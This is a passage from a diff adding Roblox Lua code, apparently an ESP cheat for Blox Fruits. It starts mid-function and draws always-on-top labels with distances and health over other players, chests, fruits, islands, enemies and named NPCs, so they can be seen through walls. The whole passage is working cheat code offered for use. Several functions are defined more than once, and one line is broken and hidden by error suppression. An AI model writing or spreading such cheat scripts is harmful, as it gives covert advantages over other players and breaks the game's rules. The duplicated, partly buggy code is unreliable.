+					if not v.Handle:FindFirstChild(("NameEsp" .. Number)) then
+						local bill = Instance.new("BillboardGui", v.Handle);
+						bill.Name = "NameEsp" .. Number;
+						bill.ExtentsOffset = Vector3.new(0, 1, 0);
+						bill.Size = UDim2.new(1, 200, 1, 30);
+						bill.Adornee = v.Handle;
+						bill.AlwaysOnTop = true;
+						local name = Instance.new("TextLabel", bill);
+						name.Font = Enum.Font.GothamSemibold;
+						name.FontSize = "Size14";
+						name.TextWrapped = true;
+						name.Size = UDim2.new(1, 0, 1, 0);
+						name.TextYAlignment = "Top";
+						name.BackgroundTransparency = 1;
+						name.TextStrokeTransparency = 0.5;
+						name.TextColor3 = Color3.fromRGB(255, 255, 255);
+						name.Text = v.Name .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+					else
+						v.Handle["NameEsp" .. Number].TextLabel.Text = v.Name .. "   \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+					end;
+				end;
+			elseif v.Handle:FindFirstChild("NameEsp" .. Number) then
+				(v.Handle:FindFirstChild("NameEsp" .. Number)):Destroy();
+			end;
+		end);
+	end;
+end;
+function UpdateFlowerChams()
+	for i, v in pairs(game.Workspace:GetChildren()) do
+		pcall(function()
+			if v.Name == "Flower2" or v.Name == "Flower1" then
+				if FlowerESP then
+					if not v:FindFirstChild(("NameEsp" .. Number)) then
+						local bill = Instance.new("BillboardGui", v);
+						bill.Name = "NameEsp" .. Number;
+						bill.ExtentsOffset = Vector3.new(0, 1, 0);
+						bill.Size = UDim2.new(1, 200, 1, 30);
+						bill.Adornee = v;
+						bill.AlwaysOnTop = true;
+						local name = Instance.new("TextLabel", bill);
+						name.Font = Enum.Font.GothamSemibold;
+						name.FontSize = "Size14";
+						name.TextWrapped = true;
+						name.Size = UDim2.new(1, 0, 1, 0);
+						name.TextYAlignment = "Top";
+						name.BackgroundTransparency = 1;
+						name.TextStrokeTransparency = 0.5;
+						name.TextColor3 = Color3.fromRGB(255, 0, 0);
+						if v.Name == "Flower1" then
+							name.Text = "Blue Flower" .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+							name.TextColor3 = Color3.fromRGB(0, 0, 255);
+						end;
+						if v.Name == "Flower2" then
+							name.Text = "Red Flower" .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+							name.TextColor3 = Color3.fromRGB(255, 0, 0);
+						end;
+					else
+						v["NameEsp" .. Number].TextLabel.Text = v.Name .. "   \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+					end;
+				elseif v:FindFirstChild("NameEsp" .. Number) then
+					(v:FindFirstChild("NameEsp" .. Number)):Destroy();
+				end;
+			end;
+		end);
+	end;
+end;
+function UpdateRealFruitChams()
+	for i, v in pairs(game.Workspace.AppleSpawner:GetChildren()) do
+		if v:IsA("Tool") then
+			if RealFruitESP then
+				if not v.Handle:FindFirstChild(("NameEsp" .. Number)) then
+					local bill = Instance.new("BillboardGui", v.Handle);
+					bill.Name = "NameEsp" .. Number;
+					bill.ExtentsOffset = Vector3.new(0, 1, 0);
+					bill.Size = UDim2.new(1, 200, 1, 30);
+					bill.Adornee = v.Handle;
+					bill.AlwaysOnTop = true;
+					local name = Instance.new("TextLabel", bill);
+					name.Font = Enum.Font.GothamSemibold;
+					name.FontSize = "Size14";
+					name.TextWrapped = true;
+					name.Size = UDim2.new(1, 0, 1, 0);
+					name.TextYAlignment = "Top";
+					name.BackgroundTransparency = 1;
+					name.TextStrokeTransparency = 0.5;
+					name.TextColor3 = Color3.fromRGB(255, 0, 0);
+					name.Text = v.Name .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+				else
+					v.Handle["NameEsp" .. Number].TextLabel.Text = v.Name .. " " .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+				end;
+			elseif v.Handle:FindFirstChild("NameEsp" .. Number) then
+				(v.Handle:FindFirstChild("NameEsp" .. Number)):Destroy();
+			end;
+		end;
+	end;
+	for i, v in pairs(game.Workspace.PineappleSpawner:GetChildren()) do
+		if v:IsA("Tool") then
+			if RealFruitESP then
+				if not v.Handle:FindFirstChild(("NameEsp" .. Number)) then
+					local bill = Instance.new("BillboardGui", v.Handle);
+					bill.Name = "NameEsp" .. Number;
+					bill.ExtentsOffset = Vector3.new(0, 1, 0);
+					bill.Size = UDim2.new(1, 200, 1, 30);
+					bill.Adornee = v.Handle;
+					bill.AlwaysOnTop = true;
+					local name = Instance.new("TextLabel", bill);
+					name.Font = Enum.Font.GothamSemibold;
+					name.FontSize = "Size14";
+					name.TextWrapped = true;
+					name.Size = UDim2.new(1, 0, 1, 0);
+					name.TextYAlignment = "Top";
+					name.BackgroundTransparency = 1;
+					name.TextStrokeTransparency = 0.5;
+					name.TextColor3 = Color3.fromRGB(255, 174, 0);
+					name.Text = v.Name .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+				else
+					v.Handle["NameEsp" .. Number].TextLabel.Text = v.Name .. " " .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+				end;
+			elseif v.Handle:FindFirstChild("NameEsp" .. Number) then
+				(v.Handle:FindFirstChild("NameEsp" .. Number)):Destroy();
+			end;
+		end;
+	end;
+	for i, v in pairs(game.Workspace.BananaSpawner:GetChildren()) do
+		if v:IsA("Tool") then
+			if RealFruitESP then
+				if not v.Handle:FindFirstChild(("NameEsp" .. Number)) then
+					local bill = Instance.new("BillboardGui", v.Handle);
+					bill.Name = "NameEsp" .. Number;
+					bill.ExtentsOffset = Vector3.new(0, 1, 0);
+					bill.Size = UDim2.new(1, 200, 1, 30);
+					bill.Adornee = v.Handle;
+					bill.AlwaysOnTop = true;
+					local name = Instance.new("TextLabel", bill);
+					name.Font = Enum.Font.GothamSemibold;
+					name.FontSize = "Size14";
+					name.TextWrapped = true;
+					name.Size = UDim2.new(1, 0, 1, 0);
+					name.TextYAlignment = "Top";
+					name.BackgroundTransparency = 1;
+					name.TextStrokeTransparency = 0.5;
+					name.TextColor3 = Color3.fromRGB(251, 255, 0);
+					name.Text = v.Name .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+				else
+					v.Handle["NameEsp" .. Number].TextLabel.Text = v.Name .. " " .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+				end;
+			elseif v.Handle:FindFirstChild("NameEsp" .. Number) then
+				(v.Handle:FindFirstChild("NameEsp" .. Number)):Destroy();
+			end;
+		end;
+	end;
+end;
+function UpdateIslandESP()
+	for i, v in pairs((game:GetService("Workspace"))._WorldOrigin.Locations:GetChildren()) do
+		pcall(function()
+			if IslandESP then
+				if v.Name ~= "Sea" then
+					if not v:FindFirstChild("NameEsp") then
+						local bill = Instance.new("BillboardGui", v);
+						bill.Name = "NameEsp";
+						bill.ExtentsOffset = Vector3.new(0, 1, 0);
+						bill.Size = UDim2.new(1, 200, 1, 30);
+						bill.Adornee = v;
+						bill.AlwaysOnTop = true;
+						local name = Instance.new("TextLabel", bill);
+						name.Font = "GothamBold";
+						name.FontSize = "Size14";
+						name.TextWrapped = true;
+						name.Size = UDim2.new(1, 0, 1, 0);
+						name.TextYAlignment = "Top";
+						name.BackgroundTransparency = 1;
+						name.TextStrokeTransparency = 0.5;
+						name.TextColor3 = Color3.fromRGB(7, 236, 240);
+					else
+						v.NameEsp.TextLabel.Text = v.Name .. "   \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+					end;
+				end;
+			elseif v:FindFirstChild("NameEsp") then
+				(v:FindFirstChild("NameEsp")):Destroy();
+			end;
+		end);
+	end;
+end;
+function isnil(thing)
+	return thing == nil;
+end;
+local function round(n)
+	return math.floor(tonumber(n) + 0.5);
+end;
+Number = math.random(1, 1000000);
+function UpdatePlayerChams()
+	for i, v in pairs((game:GetService("Players")):GetChildren()) do
+		pcall(function()
+			if not isnil(v.Character) then
+				if ESPPlayer then
+					if not isnil(v.Character.Head) and (not v.Character.Head:FindFirstChild(("NameEsp" .. Number))) then
+						local bill = Instance.new("BillboardGui", v.Character.Head);
+						bill.Name = "NameEsp" .. Number;
+						bill.ExtentsOffset = Vector3.new(0, 1, 0);
+						bill.Size = UDim2.new(1, 200, 1, 30);
+						bill.Adornee = v.Character.Head;
+						bill.AlwaysOnTop = true;
+						local name = Instance.new("TextLabel", bill);
+						name.Font = Enum.Font.GothamSemibold;
+						name.FontSize = "Size14";
+						name.TextWrapped = true;
+						name.Text = v.Name .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Character.Head.Position)).Magnitude / 3) .. " Distance";
+						name.Size = UDim2.new(1, 0, 1, 0);
+						name.TextYAlignment = "Top";
+						name.BackgroundTransparency = 1;
+						name.TextStrokeTransparency = 0.5;
+						if v.Team == game.Players.LocalPlayer.Team then
+							name.TextColor3 = Color3.new(0, 255, 0);
+						else
+							name.TextColor3 = Color3.new(255, 0, 0);
+						end;
+					else
+						v.Character.Head["NameEsp" .. Number].TextLabel.Text = v.Name .. " | " .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Character.Head.Position)).Magnitude / 3) .. " Distance\nHealth : " .. round(v.Character.Humanoid.Health * 100 / v.Character.Humanoid.MaxHealth) .. "%";
+					end;
+				elseif v.Character.Head:FindFirstChild("NameEsp" .. Number) then
+					(v.Character.Head:FindFirstChild("NameEsp" .. Number)):Destroy();
+				end;
+			end;
+		end);
+	end;
+end;
+function UpdateChestChams()
+	for i, v in pairs(game.Workspace:GetChildren()) do
+		pcall(function()
+			if string.find(v.Name, "Chest") then
+				if ChestESP then
+					if string.find(v.Name, "Chest") then
+						if not v:FindFirstChild(("NameEsp" .. Number)) then
+							local bill = Instance.new("BillboardGui", v);
+							bill.Name = "NameEsp" .. Number;
+							bill.ExtentsOffset = Vector3.new(0, 1, 0);
+							bill.Size = UDim2.new(1, 200, 1, 30);
+							bill.Adornee = v;
+							bill.AlwaysOnTop = true;
+							local name = Instance.new("TextLabel", bill);
+							name.Font = Enum.Font.GothamSemibold;
+							name.FontSize = "Size14";
+							name.TextWrapped = true;
+							name.Size = UDim2.new(1, 0, 1, 0);
+							name.TextYAlignment = "Top";
+							name.BackgroundTransparency = 1;
+							name.TextStrokeTransparency = 0.5;
+							if v.Name == "Chest1" then
+								name.TextColor3 = Color3.fromRGB(109, 109, 109);
+								name.Text = "Chest 1" .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+							end;
+							if v.Name == "Chest2" then
+								name.TextColor3 = Color3.fromRGB(173, 158, 21);
+								name.Text = "Chest 2" .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+							end;
+							if v.Name == "Chest3" then
+								name.TextColor3 = Color3.fromRGB(85, 255, 255);
+								name.Text = "Chest 3" .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+							end;
+						else
+							v["NameEsp" .. Number].TextLabel.Text = v.Name .. "   \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+						end;
+					end;
+				elseif v:FindFirstChild("NameEsp" .. Number) then
+					(v:FindFirstChild("NameEsp" .. Number)):Destroy();
+				end;
+			end;
+		end);
+	end;
+end;
+function UpdateDevilChams()
+	for i, v in pairs(game.Workspace:GetChildren()) do
+		pcall(function()
+			if DevilFruitESP then
+				if string.find(v.Name, "Fruit") then
+					if not v.Handle:FindFirstChild(("NameEsp" .. Number)) then
+						local bill = Instance.new("BillboardGui", v.Handle);
+						bill.Name = "NameEsp" .. Number;
+						bill.ExtentsOffset = Vector3.new(0, 1, 0);
+						bill.Size = UDim2.new(1, 200, 1, 30);
+						bill.Adornee = v.Handle;
+						bill.AlwaysOnTop = true;
+						local name = Instance.new("TextLabel", bill);
+						name.Font = Enum.Font.GothamSemibold;
+						name.FontSize = "Size14";
+						name.TextWrapped = true;
+						name.Size = UDim2.new(1, 0, 1, 0);
+						name.TextYAlignment = "Top";
+						name.BackgroundTransparency = 1;
+						name.TextStrokeTransparency = 0.5;
+						name.TextColor3 = Color3.fromRGB(255, 255, 255);
+						name.Text = v.Name .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+					else
+						v.Handle["NameEsp" .. Number].TextLabel.Text = v.Name .. "   \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+					end;
+				end;
+			elseif v.Handle:FindFirstChild("NameEsp" .. Number) then
+				(v.Handle:FindFirstChild("NameEsp" .. Number)):Destroy();
+			end;
+		end);
+	end;
+end;
+function UpdateFlowerChams()
+	for i, v in pairs(game.Workspace:GetChildren()) do
+		pcall(function()
+			if v.Name == "Flower2" or v.Name == "Flower1" then
+				if FlowerESP then
+					if not v:FindFirstChild(("NameEsp" .. Number)) then
+						local bill = Instance.new("BillboardGui", v);
+						bill.Name = "NameEsp" .. Number;
+						bill.ExtentsOffset = Vector3.new(0, 1, 0);
+						bill.Size = UDim2.new(1, 200, 1, 30);
+						bill.Adornee = v;
+						bill.AlwaysOnTop = true;
+						local name = Instance.new("TextLabel", bill);
+						name.Font = Enum.Font.GothamSemibold;
+						name.FontSize = "Size14";
+						name.TextWrapped = true;
+						name.Size = UDim2.new(1, 0, 1, 0);
+						name.TextYAlignment = "Top";
+						name.BackgroundTransparency = 1;
+						name.TextStrokeTransparency = 0.5;
+						name.TextColor3 = Color3.fromRGB(255, 0, 0);
+						if v.Name == "Flower1" then
+							name.Text = "Blue Flower" .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+							name.TextColor3 = Color3.fromRGB(0, 0, 255);
+						end;
+						if v.Name == "Flower2" then
+							name.Text = "Red Flower" .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+							name.TextColor3 = Color3.fromRGB(255, 0, 0);
+						end;
+					else
+						v["NameEsp" .. Number].TextLabel.Text = v.Name .. "   \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+					end;
+				elseif v:FindFirstChild("NameEsp" .. Number) then
+					(v:FindFirstChild("NameEsp" .. Number)):Destroy();
+				end;
+			end;
+		end);
+	end;
+end;
+function UpdateRealFruitChams()
+	for i, v in pairs(game.Workspace.AppleSpawner:GetChildren()) do
+		if v:IsA("Tool") then
+			if RealFruitESP then
+				if not v.Handle:FindFirstChild(("NameEsp" .. Number)) then
+					local bill = Instance.new("BillboardGui", v.Handle);
+					bill.Name = "NameEsp" .. Number;
+					bill.ExtentsOffset = Vector3.new(0, 1, 0);
+					bill.Size = UDim2.new(1, 200, 1, 30);
+					bill.Adornee = v.Handle;
+					bill.AlwaysOnTop = true;
+					local name = Instance.new("TextLabel", bill);
+					name.Font = Enum.Font.GothamSemibold;
+					name.FontSize = "Size14";
+					name.TextWrapped = true;
+					name.Size = UDim2.new(1, 0, 1, 0);
+					name.TextYAlignment = "Top";
+					name.BackgroundTransparency = 1;
+					name.TextStrokeTransparency = 0.5;
+					name.TextColor3 = Color3.fromRGB(255, 0, 0);
+					name.Text = v.Name .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+				else
+					v.Handle["NameEsp" .. Number].TextLabel.Text = v.Name .. " " .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+				end;
+			elseif v.Handle:FindFirstChild("NameEsp" .. Number) then
+				(v.Handle:FindFirstChild("NameEsp" .. Number)):Destroy();
+			end;
+		end;
+	end;
+	for i, v in pairs(game.Workspace.PineappleSpawner:GetChildren()) do
+		if v:IsA("Tool") then
+			if RealFruitESP then
+				if not v.Handle:FindFirstChild(("NameEsp" .. Number)) then
+					local bill = Instance.new("BillboardGui", v.Handle);
+					bill.Name = "NameEsp" .. Number;
+					bill.ExtentsOffset = Vector3.new(0, 1, 0);
+					bill.Size = UDim2.new(1, 200, 1, 30);
+					bill.Adornee = v.Handle;
+					bill.AlwaysOnTop = true;
+					local name = Instance.new("TextLabel", bill);
+					name.Font = Enum.Font.GothamSemibold;
+					name.FontSize = "Size14";
+					name.TextWrapped = true;
+					name.Size = UDim2.new(1, 0, 1, 0);
+					name.TextYAlignment = "Top";
+					name.BackgroundTransparency = 1;
+					name.TextStrokeTransparency = 0.5;
+					name.TextColor3 = Color3.fromRGB(255, 174, 0);
+					name.Text = v.Name .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+				else
+					v.Handle["NameEsp" .. Number].TextLabel.Text = v.Name .. " " .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+				end;
+			elseif v.Handle:FindFirstChild("NameEsp" .. Number) then
+				(v.Handle:FindFirstChild("NameEsp" .. Number)):Destroy();
+			end;
+		end;
+	end;
+	for i, v in pairs(game.Workspace.BananaSpawner:GetChildren()) do
+		if v:IsA("Tool") then
+			if RealFruitESP then
+				if not v.Handle:FindFirstChild(("NameEsp" .. Number)) then
+					local bill = Instance.new("BillboardGui", v.Handle);
+					bill.Name = "NameEsp" .. Number;
+					bill.ExtentsOffset = Vector3.new(0, 1, 0);
+					bill.Size = UDim2.new(1, 200, 1, 30);
+					bill.Adornee = v.Handle;
+					bill.AlwaysOnTop = true;
+					local name = Instance.new("TextLabel", bill);
+					name.Font = Enum.Font.GothamSemibold;
+					name.FontSize = "Size14";
+					name.TextWrapped = true;
+					name.Size = UDim2.new(1, 0, 1, 0);
+					name.TextYAlignment = "Top";
+					name.BackgroundTransparency = 1;
+					name.TextStrokeTransparency = 0.5;
+					name.TextColor3 = Color3.fromRGB(251, 255, 0);
+					name.Text = v.Name .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+				else
+					v.Handle["NameEsp" .. Number].TextLabel.Text = v.Name .. " " .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude / 3) .. " Distance";
+				end;
+			elseif v.Handle:FindFirstChild("NameEsp" .. Number) then
+				(v.Handle:FindFirstChild("NameEsp" .. Number)):Destroy();
+			end;
+		end;
+	end;
+end;
+spawn(function()
+	while wait() do
+		pcall(function()
+			if MobESP then
+				for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+					if v:FindFirstChild("HumanoidRootPart") then
+						if not v:FindFirstChild("MobEap") then
+							local BillboardGui = Instance.new("BillboardGui");
+							local TextLabel = Instance.new("TextLabel");
+							BillboardGui.Parent = v;
+							BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+							BillboardGui.Active = true;
+							BillboardGui.Name = "MobEap";
+							BillboardGui.AlwaysOnTop = true;
+							BillboardGui.LightInfluence = 1;
+							BillboardGui.Size = UDim2.new(0, 200, 0, 50);
+							BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0);
+							TextLabel.Parent = BillboardGui;
+							TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+							TextLabel.BackgroundTransparency = 1;
+							TextLabel.Size = UDim2.new(0, 200, 0, 50);
+							TextLabel.Font = Enum.Font.GothamBold;
+							TextLabel.TextColor3 = Color3.fromRGB(7, 236, 240);
+							TextLabel.Text.Size = 35;
+						end;
+						local Dis = math.floor((game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude);
+						v.MobEap.TextLabel.Text = v.Name .. " - " .. Dis .. " Distance";
+					end;
+				end;
+			else
+				for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+					if v:FindFirstChild("MobEap") then
+						v.MobEap:Destroy();
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if SeaESP then
+				for i, v in pairs((game:GetService("Workspace")).SeaBeasts:GetChildren()) do
+					if v:FindFirstChild("HumanoidRootPart") then
+						if not v:FindFirstChild("Seaesps") then
+							local BillboardGui = Instance.new("BillboardGui");
+							local TextLabel = Instance.new("TextLabel");
+							BillboardGui.Parent = v;
+							BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+							BillboardGui.Active = true;
+							BillboardGui.Name = "Seaesps";
+							BillboardGui.AlwaysOnTop = true;
+							BillboardGui.LightInfluence = 1;
+							BillboardGui.Size = UDim2.new(0, 200, 0, 50);
+							BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0);
+							TextLabel.Parent = BillboardGui;
+							TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+							TextLabel.BackgroundTransparency = 1;
+							TextLabel.Size = UDim2.new(0, 200, 0, 50);
+							TextLabel.Font = Enum.Font.GothamBold;
+							TextLabel.TextColor3 = Color3.fromRGB(7, 236, 240);
+							TextLabel.Text.Size = 35;
+						end;
+						local Dis = math.floor((game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude);
+						v.Seaesps.TextLabel.Text = v.Name .. " - " .. Dis .. " Distance";
+					end;
+				end;
+			else
+				for i, v in pairs((game:GetService("Workspace")).SeaBeasts:GetChildren()) do
+					if v:FindFirstChild("Seaesps") then
+						v.Seaesps:Destroy();
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if NpcESP then
+				for i, v in pairs((game:GetService("Workspace")).NPCs:GetChildren()) do
+					if v:FindFirstChild("HumanoidRootPart") then
+						if not v:FindFirstChild("NpcEspes") then
+							local BillboardGui = Instance.new("BillboardGui");
+							local TextLabel = Instance.new("TextLabel");
+							BillboardGui.Parent = v;
+							BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+							BillboardGui.Active = true;
+							BillboardGui.Name = "NpcEspes";
+							BillboardGui.AlwaysOnTop = true;
+							BillboardGui.LightInfluence = 1;
+							BillboardGui.Size = UDim2.new(0, 200, 0, 50);
+							BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0);
+							TextLabel.Parent = BillboardGui;
+							TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+							TextLabel.BackgroundTransparency = 1;
+							TextLabel.Size = UDim2.new(0, 200, 0, 50);
+							TextLabel.Font = Enum.Font.GothamBold;
+							TextLabel.TextColor3 = Color3.fromRGB(7, 236, 240);
+							TextLabel.Text.Size = 35;
+						end;
+						local Dis = math.floor((game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude);
+						v.NpcEspes.TextLabel.Text = v.Name .. " - " .. Dis .. " Distance";
+					end;
+				end;
+			else
+				for i, v in pairs((game:GetService("Workspace")).NPCs:GetChildren()) do
+					if v:FindFirstChild("NpcEspes") then
+						v.NpcEspes:Destroy();
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+function isnil(thing)
+	return thing == nil;
+end;
+local function round(n)
+	return math.floor(tonumber(n) + 0.5);
+end;
+Number = math.random(1, 1000000);
+function UpdateIslandMirageESP()
+	for i, v in pairs((game:GetService("Workspace"))._WorldOrigin.Locations:GetChildren()) do
+		pcall(function()
+			if MirageIslandESP then
+				if v.Name == "Mirage Island" then
+					if not v:FindFirstChild("NameEsp") then
+						local bill = Instance.new("BillboardGui", v);
+						bill.Name = "NameEsp";
+						bill.ExtentsOffset = Vector3.new(0, 1, 0);
+						bill.Size = UDim2.new(1, 200, 1, 30);
+						bill.Adornee = v;
+						bill.AlwaysOnTop = true;
+						local name = Instance.new("TextLabel", bill);
+						name.Font = "Code";
+						name.FontSize = "Size14";
+						name.TextWrapped = true;
+						name.Size = UDim2.new(1, 0, 1, 0);
+						name.TextYAlignment = "Top";
+						name.BackgroundTransparency = 1;
+						name.TextStrokeTransparency = 0.5;
+						name.TextColor3 = Color3.fromRGB(80, 245, 245);
+					else
+						v.NameEsp.TextLabel.Text = v.Name .. "   \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " M";
+					end;
+				end;
+			elseif v:FindFirstChild("NameEsp") then
+				(v:FindFirstChild("NameEsp")):Destroy();
+			end;
+		end);
+	end;
+end;
+function isnil(thing)
+	return thing == nil;
+end;
+local function round(n)
+	return math.floor(tonumber(n) + 0.5);
+end;
+Number = math.random(1, 1000000);
+function UpdateAfdESP()
+	for i, v in pairs((game:GetService("Workspace")).NPCs:GetChildren()) do
+		pcall(function()
+			if AfdESP then
+				if v.Name == "Advanced Fruit Dealer" then
+					if not v:FindFirstChild("NameEsp") then
+						local bill = Instance.new("BillboardGui", v);
+						bill.Name = "NameEsp";
+						bill.ExtentsOffset = Vector3.new(0, 1, 0);
+						bill.Size = UDim2.new(1, 200, 1, 30);
+						bill.Adornee = v;
+						bill.AlwaysOnTop = true;
+						local name = Instance.new("TextLabel", bill);
+						name.Font = "Code";
+						name.FontSize = "Size14";
+						name.TextWrapped = true;
+						name.Size = UDim2.new(1, 0, 1, 0);
+						name.TextYAlignment = "Top";
+						name.BackgroundTransparency = 1;
+						name.TextStrokeTransparency = 0.5;
+						name.TextColor3 = Color3.fromRGB(80, 245, 245);
+					else
+						v.NameEsp.TextLabel.Text = v.Name .. "   \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " M";
+					end;
+				end;
+			elseif v:FindFirstChild("NameEsp") then
+				(v:FindFirstChild("NameEsp")):Destroy();
+			end;
+		end);
+	end;
+end;
+function UpdateAuraESP()
+	for i, v in pairs((game:GetService("Workspace")).NPCs:GetChildren()) do
+		pcall(function()
+			if AuraESP then
+				if v.Name == "Master of Enhancement" then
+					if not v:FindFirstChild("NameEsp") then
+						local bill = Instance.new("BillboardGui", v);
+						bill.Name = "NameEsp";
+						bill.ExtentsOffset = Vector3.new(0, 1, 0);
+						bill.Size = UDim2.new(1, 200, 1, 30);
+						bill.Adornee = v;
+						bill.AlwaysOnTop = true;
+						local name = Instance.new("TextLabel", bill);
+						name.Font = "Code";
+						name.FontSize = "Size14";
+						name.TextWrapped = true;
+						name.Size = UDim2.new(1, 0, 1, 0);
+						name.TextYAlignment = "Top";
+						name.BackgroundTransparency = 1;
+						name.TextStrokeTransparency = 0.5;
+						name.TextColor3 = Color3.fromRGB(80, 245, 245);
+					else
+						v.NameEsp.TextLabel.Text = v.Name .. "   \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " M";
+					end;
+				end;
+			elseif v:FindFirstChild("NameEsp") then
+				(v:FindFirstChild("NameEsp")):Destroy();
+			end;
+		end);
+	end;
+end;
+function UpdateLSDESP()
+	for i, v in pairs((game:GetService("Workspace")).NPCs:GetChildren()) do
+		pcall(function()
+			if LADESP then
+				if v.Name == "Legendary Sword Dealer" then
+					if not v:FindFirstChild("NameEsp") then
+						local bill = Instance.new("BillboardGui", v);
+						bill.Name = "NameEsp";
+						bill.ExtentsOffset = Vector3.new(0, 1, 0);
+						bill.Size = UDim2.new(1, 200, 1, 30);
+						bill.Adornee = v;
+						bill.AlwaysOnTop = true;
+						local name = Instance.new("TextLabel", bill);
+						name.Font = "Code";
+						name.FontSize = "Size14";
+						name.TextWrapped = true;
+						name.Size = UDim2.new(1, 0, 1, 0);
+						name.TextYAlignment = "Top";
+						name.BackgroundTransparency = 1;
+						name.TextStrokeTransparency = 0.5;
+						name.TextColor3 = Color3.fromRGB(80, 245, 245);
+					else
+						v.NameEsp.TextLabel.Text = v.Name .. "   \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " M";
+					end;
+				end;
+			elseif v:FindFirstChild("NameEsp") then
+				(v:FindFirstChild("NameEsp")):Destroy();
+			end;
+		end);
+	end;
+end;
+function UpdateGeaESP()
+	for i, v in pairs((game:GetService("Workspace")).Map.MysticIsland:GetChildren()) do
+		pcall(function()
+			if GearESP then
+				if v.Name == "MeshPart" then
+					if not v:FindFirstChild("NameEsp") then
+						local bill = Instance.new("BillboardGui", v);
+						bill.Name = "NameEsp";
+						bill.ExtentsOffset = Vector3.new(0, 1, 0);
+						bill.Size = UDim2.new(1, 200, 1, 30);
+						bill.Adornee = v;
+						bill.AlwaysOnTop = true;
+						local name = Instance.new("TextLabel", bill);
+						name.Font = "Code";
+						name.FontSize = "Size14";
+						name.TextWrapped = true;
+						name.Size = UDim2.new(1, 0, 1, 0);
+						name.TextYAlignment = "Top";
+						name.BackgroundTransparency = 1;
+						name.TextStrokeTransparency = 0.5;
+						name.TextColor3 = Color3.fromRGB(80, 245, 245);
+					else
+						v.NameEsp.TextLabel.Text = v.Name .. "   \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " M";
+					end;
+				end;
